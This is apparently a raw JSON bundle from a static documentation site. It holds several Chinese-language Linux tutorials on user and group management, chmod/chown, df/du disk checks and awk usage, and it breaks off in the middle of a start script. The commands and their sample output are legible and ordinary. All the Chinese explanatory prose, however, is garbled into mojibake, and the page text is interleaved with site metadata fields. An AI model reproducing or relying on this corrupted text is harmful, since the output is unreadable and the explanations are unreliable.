åºæ¬ç»ï¼å¦ææ²¡ææå®ç¨æ·ç»ï¼åå»ºç¨æ·çæ¶åç³»ç»ä¼é»è®¤åæ¶åå»ºä¸ä¸ªåè¿ä¸ªç¨æ·åååçç»ï¼è¿ä¸ªç»å°±æ¯åºæ¬ç»ï¼ä¸å¯ä»¥æç¨æ·ä»åºæ¬ç»ä¸­å é¤ãå¨åå»ºæä»¶æ¶ï¼æä»¶çæå±ç»å°±æ¯ç¨æ·çåºæ¬ç»ã\n> -g éå ç»ï¼é¤äºåºæ¬ç»ä¹å¤ï¼ç¨æ·æå¨çå¶ä»ç»ï¼é½æ¯éå ç»ãç¨æ·æ¯å¯ä»¥ä»éå ç»ä¸­è¢«å é¤çã\n> ç¨æ·ä¸è®ºä¸ºä¸åºæ¬ç»ä¸­è¿æ¯éå ç»ä¸­ï¼å°±ä¼æ¥æè¯¥ç»çæéãä¸ä¸ªç¨æ·å¯ä»¥å±äºå¤ä¸ªéå ç»ãä½æ¯ä¸ä¸ªç¨æ·åªè½æä¸ä¸ªåºæ¬ç»ã\n\næ¥çææç¨æ·\n\ncat /etc/passwd\n\n\n1\n\n\næ·»å \n\nuseradd xulei -d /home/users/xulei\n\n\n1\n\n\nå é¤ç¨æ·åå³èçç®å½\n\nuserdel -r xulei\n\n\n1\n\n\n\n# usermod\n\nusermod å½ä»¤ç¨äºä¿®æ¹ç¨æ·å¸å·ã\n\n * -c <å¤æ³¨> ãä¿®æ¹ç¨æ·å¸å·çå¤æ³¨æå­ã\n * -d ç»å¥ç®å½ > ãä¿®æ¹ç¨æ·ç»å¥æ¶çç®å½ã\n * -e <æææé> ãä¿®æ¹å¸å·çæææéã\n * -f <ç¼å²å¤©æ°> ãä¿®æ¹å¨å¯ç è¿æåå¤å°å¤©å³å³é­è¯¥å¸å·ã\n * -g <ä¸»ç»> ãä¿®æ¹ç¨æ·æå±ä¸»ç»ã\n * -g <ç¾¤ç»> ãä¿®æ¹ç¨æ·æå±çéå ç¾¤ç»ã\n * -l <å¸å·åç§°> ãä¿®æ¹ç¨æ·å¸å·åç§°ã\n * -l éå®ç¨æ·å¯ç ï¼ä½¿å¯ç æ æã\n * -s ä¿®æ¹ç¨æ·ç»å¥åæä½¿ç¨ç shellã\n * -u ä¿®æ¹ç¨æ· idã\n * -u è§£é¤å¯ç éå®ã\n * -a ä»£è¡¨ appendï¼ä¹å°±æ¯å°ç¨æ·æ·»å å°æ°ç¨æ·ç»ä¸­èä¸å¿ç¦»å¼åæçå¶ä»ç¨æ·ç»\n\nå° xulei æ·»å å° root ç»\n\nusermod -g root xulei\n\n\n1\n\n\nå¦ææ·»å çç¨æ·ä¸è½éè¿ ssh ç»å½ï¼å¯ä»¥æ¥çç¨æ·åå¦æ bash æé\n\n# æ¥çææç¨æ·ï¼å¯ä»¥æ¥çç¨æ·æ¯å¦æå¦ä¸è·¯å¾\ncat /etc/passwd\n# ä¿®æ¹ç¨æ·æ /bin/bash æé\nusermod -s /bin/bash ç¨æ·å\n# ç¦æ­¢ç¨æ·æ /bin/bash æ¹ä¸º /sbin/nologin\nusermod -s /sbin/nologin ç¨æ·å\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# ç¨æ·ç» group\n\nå³äºç»çå¢å åå é¤ä¿¡æ¯ä¼å¨ etc ç®å½ç group æä»¶ä¸­æ¾å°ï¼å½ä»¤ cat /etc/group å¯ä»¥çå°èªå·±çåç»ååç» idï¼0 è¡¨ç¤ºç®¡çåï¼rootï¼ï¼1 - 500 è¡¨ç¤ºç³»ç»ç¨æ·ã\n\ngroupadd å½ä»¤ è¯­æ³æ ¼å¼å¦ä¸ï¼\n\n * -gï¼æå®æ°å»ºå·¥ä½ç»ç idï¼\n * -rï¼åå»ºç³»ç»å·¥ä½ç»ï¼ç³»ç»å·¥ä½ç»çç» id å°äº 500ï¼\n * -kï¼è¦çéç½®æä»¶ "/ect/login.defs"ï¼\n * -oï¼åè®¸æ·»å ç» id å·ä¸å¯ä¸çå·¥ä½ç»ã\n * -f,--force: å¦ææå®çç»å·²ç»å­å¨ï¼æ­¤éé¡¹å°å¤±æäºä»ä»¥æåç¶æéåºãå½ä¸ -g ä¸èµ·ä½¿ç¨ï¼å¹¶ä¸æå®ç gid_min å·²ç»å­å¨æ¶ï¼éæ©å¦ä¸ä¸ªå¯ä¸ç gidï¼å³ - g å³é­ï¼ã\n\næ¥çææç»\n\ncat /etc/group\n\n\n1\n\n\næ¥çå½åç»\n\n[xulei@node102 sh]$ groups \nxulei\n\n\n1\n2\n\n\næ¥çç¨æ·æå±ç»\n\n[xulei@node102 sh]$ groups root\nroot : root\n\n\n1\n2\n\n\nå é¤ç»\n\ngroupdel xulei\n\n\n1\n\n\næ·»å é¢å¤ç»\n\nusermod -a -g ç»åç§° ç¨æ·å\n\n\n1\n\n\n\n# æä»¶æé chown\n\nç¨æ¥æ´æ¹æä¸ªç®å½ææä»¶çç¨æ·ååç¨æ·ç»ã\n\n * user : æ°çæ¡£æ¡æ¥æèçä½¿ç¨è id\n * group : æ°çæ¡£æ¡æ¥æèçä½¿ç¨èç¾¤ä½ (group)\n * -c : è¥è¯¥æ¡£æ¡æ¥æèç¡®å®å·²ç»æ´æ¹ï¼ææ¾ç¤ºå¶æ´æ¹å¨ä½\n * -f : è¥è¯¥æ¡£æ¡æ¥æèæ æ³è¢«æ´æ¹ä¹ä¸è¦æ¾ç¤ºéè¯¯è®¯æ¯\n * -h : åªå¯¹äºè¿ç» (link) è¿è¡åæ´ï¼èéè¯¥ link çæ­£æåçæ¡£æ¡\n * -v : æ¾ç¤ºæ¥æèåæ´çè¯¦ç»èµæ\n * -r : å¯¹ç®åç®å½ä¸çæææ¡£æ¡ä¸å­ç®å½è¿è¡ç¸åçæ¥æèåæ´ (å³ä»¥éåçæ¹å¼éä¸ªåæ´)\n * --help : æ¾ç¤ºè¾å©è¯´æ\n * --version : æ¾ç¤ºçæ¬\n\nä¿®æ¹ abc æä»¶çææè\n\nchown root abc\n\n\n1\n\n\næç®å½ /demo åå¶ä¸çæææä»¶åå­ç®å½çææäººæ¹æ rootï¼æå±ç»æ¹æ rootaã\n\nchown -r root:roota /demo\n\n\n1\n\n\n\n# chmod\n\n-rwxr--r--. 1 xulei root  98 sep  7 11:49 arp.sh\n\n\n1\n\n\n-rwxr--r-- ä¸å± 10 ä¸ªå­ç¬¦ï¼ä¸é¢è®²è§£ä¸ï¼\n\n * d è¡¨ç¤ºç®å½ï¼å¦ææ¯ - è¡¨ç¤ºæ¯ä¸ä¸ªæ®éæä»¶ãå©ä½ç 9 ä¸ªå­ç¬¦ï¼åæ 3 ç»ï¼æ¯ç» 3 ä¸ªå­ç¬¦ï¼åå«è¡¨ç¤º user/group/others ç rwx æéï¼\n * u user è¡¨ç¤ºæ¥æèï¼å¯ä»¥çå°æ¥æèæ¯ xulei ç¨æ·ï¼ä½æä»¶è¿å±äº root ç»ï¼å æ­¤ xulei è¿æ¯æ æ³æ§è¡è¯¥æä»¶ã\n * g group è¡¨ç¤ºç»ï¼é¤äº mysql è¿ä¸ªäººç åä¸ä¸ª mysql ç»æ¥æçæå\n * o others å°±æ¯å¶ä»äººäºï¼å¥æéä¹æ²¡æã\n * a è¡¨ç¤º âææ (all) ç¨æ·âãå®æ¯ç³»ç»é»è®¤å¼ã\n\n[root@node102 sh]# chmod a+rwx checklogin.sh \n[root@node102 sh]# ll\ntotal 16\n-rwxr--r--. 1 xulei root  98 sep  7 11:49 arp.sh\n-rwxrwxrwx. 1 xulei root 353 jan 19 17:31 checklogin.sh\n-rwxr--r--. 1 root  root 123 sep  7 10:39 nginx_check.sh\n-rwxr-xr-x. 1 root  root 595 nov 27 15:15 start.sh\n\n\n1\n2\n3\n4\n5\n6\n7\n',charsets:{cjk:!0}},{title:"Linux ç£çæä½ç¸å³å½ä»¤",frontmatter:{title:"Linux ç£çæä½ç¸å³å½ä»¤",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2301",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/2300.linux/2301.Linux%20%E7%A3%81%E7%9B%98%E6%93%8D%E4%BD%9C%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4.html",relativePath:"04.è¿ç»´/2300.linux/2301.Linux ç£çæä½ç¸å³å½ä»¤.md",key:"v-4fbe8f80",path:"/linux/2301/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:"Df å½ä»¤æ¯ linux ç³»ç»ä»¥ç£çååºä¸ºåä½æ¥çæä»¶ç³»ç»ï¼å¯ä»¥å ä¸åæ°æ¥çç£çå©ä½ç©ºé´ä¿¡æ¯ï¼å½ä»¤æ ¼å¼ä½ df -h ï¼æ¾ç¤ºåå®¹å¦ä¸ï¼\n\nFILESYSTEM   SIZE   USED   AVAIL   USE%   MOUNTED ON\næä»¶ç³»ç»         å®¹é     å¯ç¨     Use%    å·²ç¨ %   æè½½ç¹\n/dev/hda2    45G    19G    24G     44%    /\n/dev/hda1    494M   19M    450M    4%     /boot\n\næ¥çç£çå©ä½ç©ºé´ df -hl\n\n[root@localhost /]# df -hl\nFilesystem               Size  Used Avail Use% Mounted on\ndevtmpfs                 1.9G     0  1.9G   0% /dev\ntmpfs                    1.9G     0  1.9G   0% /dev/shm\ntmpfs                    1.9G   29M  1.9G   2% /run\ntmpfs                    1.9G     0  1.9G   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47G   16G   32G  34% /\n/dev/sda1               1014M  326M  689M  33% /boot\ntmpfs                    378M  8.0K  378M   1% /run/user/42\ntmpfs                    378M   32K  378M   1% /run/user/1000\n/dev/sr0                 4.3G  4.3G     0 100% /run/media/fengqianrun/CentOS 7 x86_64\ntmpfs                    378M     0  378M   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\næ¥çæ¯ä¸ªæ ¹è·¯å¾çååºå¤§å° df -h\n\n[root@localhost /]# df -h\nFilesystem               Size  Used Avail Use% Mounted on\ndevtmpfs                 1.9G     0  1.9G   0% /dev\ntmpfs                    1.9G     0  1.9G   0% /dev/shm\ntmpfs                    1.9G   29M  1.9G   2% /run\ntmpfs                    1.9G     0  1.9G   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47G   16G   32G  34% /\n/dev/sda1               1014M  326M  689M  33% /boot\ntmpfs                    378M  8.0K  378M   1% /run/user/42\ntmpfs                    378M   32K  378M   1% /run/user/1000\n/dev/sr0                 4.3G  4.3G     0 100% /run/media/fengqianrun/CentOS 7 x86_64\ntmpfs                    378M     0  378M   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nè¿åè¯¥ç®å½çå¤§å° du -sh [ç®å½å]\n\n[root@localhost /]# du -sh /root\n803M    /root\n\n\n1\n2\n\n\nè¿åè¯¥æä»¶å¤¹æ» M æ° du -sm [æä»¶å¤¹]\n\n[root@localhost /]# du -sm /root\n803     /root\n\n\n1\n2\n\n\næ¥çæå®æä»¶å¤¹ä¸çæææä»¶å¤§å°ï¼åå«å­æä»¶å¤¹) du -h [ç®å½å]\n\n[root@localhost /]# du -h /root\n12K     /root/redis-6.0.5/utils/hyperloglog\n20K     /root/redis-6.0.5/utils/lru\n20K     /root/redis-6.0.5/utils/releasetools\n12K     /root/redis-6.0.5/utils/srandmember\n164K    /root/redis-6.0.5/utils\n71M     /root/redis-6.0.5\n803M    /root\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\näº§çæä»¶å±äºåªä¸ªç£ç df -h [ç®å½]\n\n# æ²¡ææè½½ç£ççç®å½ï¼æ¾ç¤ºå¨ç³»ç»ç\n[root@iZ2ze57v3n0zma46zqiq8nZ sh-1.5.5]# df -h /alidata/\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/vda1        40G  4.6G   33G  13% /\n\n\n1\n2\n3\n4\n\n\n# æè½½äºç£ççç®å½ï¼æ¾ç¤ºå¨æ°æ®çååºvdb1\n[root@iZ2ze57v3n0zma46zqiq8nZ sh-1.5.5]# df -h /mnt/\nFilesystem      Size  Used Avail Use% Mounted on\n/dev/vdb1        20G   45M   19G   1% /mnt\n\n\n1\n2\n3\n4\n\n\nå¨æ¾ç¤ºç»æä¸­ç Filesystem å Mounted onï¼è¿ä¸¤åå°±æ¯è¿ä¸ªç®å½æå±çç£çååºã\nå ä¸º Linux æ¯æ å½¢æä»¶ç³»ç»ï¼ç®å½å±äºåªä¸ªç£çååºåå³äºæè½½ç£çæ¶çæè½½ç¹ï¼æä»¥è¦æ³ç¥éç®å½å¨åªä¸ªååºï¼å°±è¦åå©æ¾ç¤ºç£ççä¿¡æ¯ï¼ç¹å«è½æ¾ç¤ºæè½½ç¹ï¼çå½ä»¤ãdf å½ä»¤æ¯æ¾ç¤ºç£çå®¹éçï¼ä½æ¯ä»¥ç®å½ä½ä¸ºåæ°ï¼å¯ä»¥æ¾ç¤ºç®å½æå¨ç£ççä¿¡æ¯ãæä»¥è¿ä¸ªç¬¨åæ³ä¹ç®æ¯ä¸ªå¥½åæ³å§ã",normalizedContent:"df å½ä»¤æ¯ linux ç³»ç»ä»¥ç£çååºä¸ºåä½æ¥çæä»¶ç³»ç»ï¼å¯ä»¥å ä¸åæ°æ¥çç£çå©ä½ç©ºé´ä¿¡æ¯ï¼å½ä»¤æ ¼å¼ä½ df -h ï¼æ¾ç¤ºåå®¹å¦ä¸ï¼\n\nfilesystem   size   used   avail   use%   mounted on\næä»¶ç³»ç»         å®¹é     å¯ç¨     use%    å·²ç¨ %   æè½½ç¹\n/dev/hda2    45g    19g    24g     44%    /\n/dev/hda1    494m   19m    450m    4%     /boot\n\næ¥çç£çå©ä½ç©ºé´ df -hl\n\n[root@localhost /]# df -hl\nfilesystem               size  used avail use% mounted on\ndevtmpfs                 1.9g     0  1.9g   0% /dev\ntmpfs                    1.9g     0  1.9g   0% /dev/shm\ntmpfs                    1.9g   29m  1.9g   2% /run\ntmpfs                    1.9g     0  1.9g   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47g   16g   32g  34% /\n/dev/sda1               1014m  326m  689m  33% /boot\ntmpfs                    378m  8.0k  378m   1% /run/user/42\ntmpfs                    378m   32k  378m   1% /run/user/1000\n/dev/sr0                 4.3g  4.3g     0 100% /run/media/fengqianrun/centos 7 x86_64\ntmpfs                    378m     0  378m   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\næ¥çæ¯ä¸ªæ ¹è·¯å¾çååºå¤§å° df -h\n\n[root@localhost /]# df -h\nfilesystem               size  used avail use% mounted on\ndevtmpfs                 1.9g     0  1.9g   0% /dev\ntmpfs                    1.9g     0  1.9g   0% /dev/shm\ntmpfs                    1.9g   29m  1.9g   2% /run\ntmpfs                    1.9g     0  1.9g   0% /sys/fs/cgroup\n/dev/mapper/centos-root   47g   16g   32g  34% /\n/dev/sda1               1014m  326m  689m  33% /boot\ntmpfs                    378m  8.0k  378m   1% /run/user/42\ntmpfs                    378m   32k  378m   1% /run/user/1000\n/dev/sr0                 4.3g  4.3g     0 100% /run/media/fengqianrun/centos 7 x86_64\ntmpfs                    378m     0  378m   0% /run/user/0\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nè¿åè¯¥ç®å½çå¤§å° du -sh [ç®å½å]\n\n[root@localhost /]# du -sh /root\n803m    /root\n\n\n1\n2\n\n\nè¿åè¯¥æä»¶å¤¹æ» m æ° du -sm [æä»¶å¤¹]\n\n[root@localhost /]# du -sm /root\n803     /root\n\n\n1\n2\n\n\næ¥çæå®æä»¶å¤¹ä¸çæææä»¶å¤§å°ï¼åå«å­æä»¶å¤¹) du -h [ç®å½å]\n\n[root@localhost /]# du -h /root\n12k     /root/redis-6.0.5/utils/hyperloglog\n20k     /root/redis-6.0.5/utils/lru\n20k     /root/redis-6.0.5/utils/releasetools\n12k     /root/redis-6.0.5/utils/srandmember\n164k    /root/redis-6.0.5/utils\n71m     /root/redis-6.0.5\n803m    /root\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\näº§çæä»¶å±äºåªä¸ªç£ç df -h [ç®å½]\n\n# æ²¡ææè½½ç£ççç®å½ï¼æ¾ç¤ºå¨ç³»ç»ç\n[root@iz2ze57v3n0zma46zqiq8nz sh-1.5.5]# df -h /alidata/\nfilesystem      size  used avail use% mounted on\n/dev/vda1        40g  4.6g   33g  13% /\n\n\n1\n2\n3\n4\n\n\n# æè½½äºç£ççç®å½ï¼æ¾ç¤ºå¨æ°æ®çååºvdb1\n[root@iz2ze57v3n0zma46zqiq8nz sh-1.5.5]# df -h /mnt/\nfilesystem      size  used avail use% mounted on\n/dev/vdb1        20g   45m   19g   1% /mnt\n\n\n1\n2\n3\n4\n\n\nå¨æ¾ç¤ºç»æä¸­ç filesystem å mounted onï¼è¿ä¸¤åå°±æ¯è¿ä¸ªç®å½æå±çç£çååºã\nå ä¸º linux æ¯æ å½¢æä»¶ç³»ç»ï¼ç®å½å±äºåªä¸ªç£çååºåå³äºæè½½ç£çæ¶çæè½½ç¹ï¼æä»¥è¦æ³ç¥éç®å½å¨åªä¸ªååºï¼å°±è¦åå©æ¾ç¤ºç£ççä¿¡æ¯ï¼ç¹å«è½æ¾ç¤ºæè½½ç¹ï¼çå½ä»¤ãdf å½ä»¤æ¯æ¾ç¤ºç£çå®¹éçï¼ä½æ¯ä»¥ç®å½ä½ä¸ºåæ°ï¼å¯ä»¥æ¾ç¤ºç®å½æå¨ç£ççä¿¡æ¯ãæä»¥è¿ä¸ªç¬¨åæ³ä¹ç®æ¯ä¸ªå¥½åæ³å§ã",charsets:{cjk:!0}},{title:"Linux ææ¬æ°æ®å¤çå·¥å·awkå½ä»¤",frontmatter:{title:"Linux ææ¬æ°æ®å¤çå·¥å·awkå½ä»¤",date:"2023-06-25T09:22:36.000Z",permalink:"/linux/2302",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E8%BF%90%E7%BB%B4/2300.linux/2302.Linux%20%E6%96%87%E6%9C%AC%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E5%B7%A5%E5%85%B7awk%E5%91%BD%E4%BB%A4.html",relativePath:"04.è¿ç»´/2300.linux/2302.Linux ææ¬æ°æ®å¤çå·¥å·awkå½ä»¤.md",key:"v-008f5f06",path:"/linux/2302/",headers:[{level:2,title:"Fï¼æå®å­æ®µåéç¬¦ï¼",slug:"f-æå®å­æ®µåéç¬¦",normalizedTitle:"fï¼æå®å­æ®µåéç¬¦ï¼",charIndex:79},{level:2,title:"FSï¼å­æ®µåéç¬¦ï¼",slug:"fs-å­æ®µåéç¬¦",normalizedTitle:"fsï¼å­æ®µåéç¬¦ï¼",charIndex:368},{level:2,title:"NFï¼å½åè¡çå­æ®µä¸ªæ°ï¼",slug:"nf-å½åè¡çå­æ®µä¸ªæ°",normalizedTitle:"nfï¼å½åè¡çå­æ®µä¸ªæ°ï¼",charIndex:683},{level:2,title:"NR (å½åå¤ççæ¯ç¬¬å è¡)",slug:"nr-å½åå¤ççæ¯ç¬¬å è¡",normalizedTitle:"nr (å½åå¤ççæ¯ç¬¬å è¡)",charIndex:900},{level:2,title:"FILENAME(å½åæä»¶å)",slug:"filename-å½åæä»¶å",normalizedTitle:"filename (å½åæä»¶å)",charIndex:1458},{level:2,title:"å¶ä»åé",slug:"å¶ä»åé",normalizedTitle:"å¶ä»åé",charIndex:1794},{level:2,title:"print å printf",slug:"print-å-printf",normalizedTitle:"print å printf",charIndex:1911},{level:2,title:"å¶ä»å½æ°",slug:"å¶ä»å½æ°",normalizedTitle:"å¶ä»å½æ°",charIndex:2139},{level:2,title:"æ¡ä»¶",slug:"æ¡ä»¶",normalizedTitle:"æ¡ä»¶",charIndex:2690},{level:2,title:"demo",slug:"demo",normalizedTitle:"demo",charIndex:3964}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Fï¼æå®å­æ®µåéç¬¦ï¼ FSï¼å­æ®µåéç¬¦ï¼ NFï¼å½åè¡çå­æ®µä¸ªæ°ï¼ NR (å½åå¤ççæ¯ç¬¬å è¡) FILENAME(å½åæä»¶å) å¶ä»åé print å printf å¶ä»å½æ° æ¡ä»¶ demo",content:'awk å½ä»¤æ¯éè¡æ«ææä»¶ï¼ä»ç¬¬ 1 è¡å°æåä¸è¡ï¼ï¼å¯»æ¾å«æç®æ ææ¬çè¡ï¼å¦æå¹éæåï¼åä¼å¨è¯¥è¡ä¸æ§è¡ç¨æ·æ³è¦çæä½ï¼åä¹ï¼åä¸å¯¹è¡åä»»ä½å¤çã\n\n\n# Fï¼æå®å­æ®µåéç¬¦ï¼\n\né»è®¤ä½¿ç¨ç©ºæ ¼ä½ä¸ºåéç¬¦ã\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print $1}\'\naa\n[root@localhost awk]# echo "aa bb l cc dd l ee ff" | awk -F \'l\' \'{print $1}\'\naa bb \n[root@localhost awk]# echo "aa bb  cc : dd  ee ff" | awk -F \':\' \'{print $1}\'\naa bb  cc \n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# FSï¼å­æ®µåéç¬¦ï¼\n\né»è®¤æ¯ç©ºæ ¼åå¶è¡¨ç¬¦ã\n$0 è¡¨ç¤ºå½åæ´è¡åå®¹ï¼$1ï¼$2 è¡¨ç¤ºç¬¬ä¸ä¸ªå­æ®µï¼ç¬¬äºä¸ªå­æ®µ\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $0}\'\naa bb cc  dd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $1}\'\naa\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $2}\'\nbb\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# NFï¼å½åè¡çå­æ®µä¸ªæ°ï¼\n\nå°±ä»£è¡¨æåä¸ä¸ªå­æ®µï¼(NF-1) ä»£è¡¨åæ°ç¬¬äºä¸ªå­æ®µ\n\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $NF}\'\ndd\n[root@localhost zabbix_agentd.d]# echo "aa bb cc  dd" | awk \'{ print $(NF-1)}\'\ncc\n\n\n1\n2\n3\n4\n\n\n\n# NR (å½åå¤ççæ¯ç¬¬å è¡)\n\næå°å½åè¡å·åå½åææ¬åå®¹\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \'{print NR")", $0}\'\n1) aa ss\n2) dd ff\n3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\néå·è¡¨ç¤ºè¾åºçåéä¹é´ç¨ç©ºæ ¼åéï¼\nå³æ¬å·å¿éä½¿ç¨ åå¼å· æå¯ä»¥åæ ·è¾åº\næå°æå®è¡åå®¹ï¼\n\n[root@localhost S17]# java -version \njava version "1.8.0_131"\nJava(TM) SE Runtime Environment (build 1.8.0_131-b11)\nJava HotSpot(TM) 64-Bit Server VM (build 25.131-b11, mixed mode)\n[root@localhost S17]# java -version 2>&1  | awk \'NR==1 {print $0}\'\njava version "1.8.0_131"\n[root@localhost S17]# \n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# FILENAME (å½åæä»¶å)\n\n[root@localhost awk]#  awk \'{print FILENAME, NR")", $0}\' test.txt \ntest.txt 1) aa ss\ntest.txt 2) dd ff\ntest.txt 3) gg hh\n[root@localhost awk]# cat test.txt | awk \'{print FILENAME, NR")", $0}\'\n- 1) aa ss\n- 2) dd ff\n- 3) gg hh\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nawk \'{condition action}\' filename è¿ç§å½¢å¼æ¶å¯ä»¥æå°æä»¶åï¼\néè¿ |ï¼ç®¡éç¬¦ï¼è¯»ååå®¹æ¶æå°çæ¯ -\n\n\n# å¶ä»åé\n\nRSï¼è¡åéç¬¦ï¼ç¨äºåå²æ¯ä¸è¡ï¼é»è®¤æ¯æ¢è¡ç¬¦ã\nOFSï¼è¾åºå­æ®µçåéç¬¦ï¼ç¨äºæå°æ¶åéå­æ®µï¼é»è®¤ä¸ºç©ºæ ¼ã\nORSï¼è¾åºè®°å½çåéç¬¦ï¼ç¨äºæå°æ¶åéè®°å½ï¼é»è®¤ä¸ºæ¢è¡ç¬¦ã\nOFMTï¼æ°å­è¾åºçæ ¼å¼ï¼é»è®¤ä¸ºï¼.6gã\n\n\n# print å printf\n\nawk ä¸­åæ¶æä¾äº print å printf ä¸¤ç§æå°è¾åºçå½æ°ã\n\nprint å½æ°ï¼åæ°å¯ä»¥æ¯åéãæ°å¼æèå­ç¬¦ä¸²ãå­ç¬¦ä¸²å¿é¡»ç¨åå¼å·å¼ç¨ï¼åæ°ç¨éå·åéãå¦ææ²¡æéå·ï¼åæ°å°±ä¸²èå¨ä¸èµ·èæ æ³åºåãè¿éï¼éå·çä½ç¨ä¸è¾åºæä»¶çåéç¬¦çä½ç¨æ¯ä¸æ ·çï¼åªæ¯åèæ¯ç©ºæ ¼èå·²ã\n\nprintf å½æ°ï¼å¶ç¨æ³å c è¯­è¨ä¸­ printf åºæ¬ç¸ä¼¼ï¼å¯ä»¥æ ¼å¼åå­ç¬¦ä¸²ï¼è¾åºå¤ææ¶ï¼printf æ´å å¥½ç¨ï¼ä»£ç æ´ææã\n\n\n# å¶ä»å½æ°\n\ntoupper ()ï¼å­ç¬¦è½¬ä¸ºå¤§åã\ntolower ()ï¼å­ç¬¦è½¬ä¸ºå°åã\nlength ()ï¼è¿åå­ç¬¦ä¸²é¿åº¦ã\nsubstr ()ï¼è¿åå­å­ç¬¦ä¸²ã\nsubstr ($1,2)ï¼è¿åç¬¬ä¸ä¸ªå­æ®µï¼ä»ç¬¬ 2 ä¸ªå­ç¬¦å¼å§ä¸ç´å°ç»æã\nsubstr ($1,2,3)ï¼è¿åç¬¬ä¸ä¸ªå­æ®µï¼ä»ç¬¬ 2 ä¸ªå­ç¬¦å¼å§å¼å§åç 3 ä¸ªå­ç¬¦ã\nsin ()ï¼æ­£å¼¦ã\ncos ()ï¼ä½å¼¦ã\nsqrt ()ï¼å¹³æ¹æ ¹ã\nrand ()ï¼éæºæ°ã\n\n[root@localhost awk]# echo "aa bb  cc dd  ee ff" | awk  \'{print toupper($1)}\'\nAA\n[root@localhost awk]# echo "aa BB  cc dd  ee ff" | awk  \'{print tolower($2)}\'\nbb\n[root@localhost awk]# echo "aa BB  cc dd  ee ff" | awk  \'{print length($2)}\'\n2\n[root@localhost awk]# echo "asdfghj" | awk \'{print substr($1,2,3)}\'\nsdf\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# æ¡ä»¶\n\nawk åè®¸æå®è¾åºæ¡ä»¶ï¼åªè¾åºç¬¦åæ¡ä»¶çè¡ã\nawk \' æ¡ä»¶ {å¨ä½}\' æä»¶å\n\n[root@localhost awk]# cat exp.txt \n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/chenfan\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'/stsvc/ {print $0}\'     åå« stsvc çè¡\n/stsvc/fms/conf/application.yml\n/stsvc/sms/conf/application.yml\n/stsvc/tms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'/stsvc\\/fms/ {print $0}\' åå« stsvc/fms çè¡\n/stsvc/fms/conf/application.yml\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\nå¸å°å¼å¤æ­\n\n[root@localhost awk]# cat exp.txt | awk \'NR==2 {print $0}\'ããç­äºç¬¬äºè¡\n/stsvc/sms/conf/application.yml\n[root@localhost awk]# cat exp.txt | awk \'NR>4 {print $0}\'ããå¤§äºç¬¬åè¡\n/root/home/jhhuang\n[root@localhost awk]# cat exp.txt | awk \'NR%2==1 {print $0}\'ããå¥æ°è¡\n/stsvc/fms/conf/application.yml\n/stsvc/tms/conf/application.yml\n/root/home/jhhuang\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næä¸ªå­æ®µç­äºå·ä½å¼\n\n[root@localhost awk]# cat test.txt \naa ss\ndd ff\ngg hh\n[root@localhost awk]# cat test.txt | awk \' $2=="ff" {print $0}\'\ndd ff\n\n\n1\n2\n3\n4\n5\n6\n\n\nif è¯­å¥\n\n[root@localhost awk]# echo "aa ss dd" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\naa ss dd\n[root@localhost awk]# echo "aa ss dds" | awk \'{ if($3 == "dd") print $0; else print "nothing"}\'\nnothing\n\n\n1\n2\n3\n4\n\n\n\n# demo\n\nä»¥ä¸èæ¬å¤å¶ç²è´´å°±å¯ç¨ï¼éè¦å¨ååºç¨åçº§ç®å½æ°å»ºä¸ä¸ª logs æä»¶å¤¹ï¼ä½¿ç¨æ¹æ³ ./ èæ¬.sh start åºç¨åç§°.jarï¼å¶ä¸­ä½¿ç¨äº awk å½ä»¤è§£å³è·å pid é®é¢\n\n#/bin/bash\n\n# è¿éè¯´ä¸ä¸ æç¨ /bin/sh èæ¬éæå°éæ­£å¸¸ æ¢æ /bin/bash å°±å¥½äº\n# éè¿æ§è¡æä»¶è·å¾ è¦è¢«æ§è¡çjar ä¾å¦ ./start.sh test-0.0.1.jar è·åå° test-0.0.1.jar\n# $@è·å¾ææåæ°,$1è·å¾ç¬¬ä¸ä¸ªåæ°\nMATHOD=$1\nAPP_NAME=$2\n# å¨æ¹æ³åç´æ¥ä½¿ç¨æ¯æ 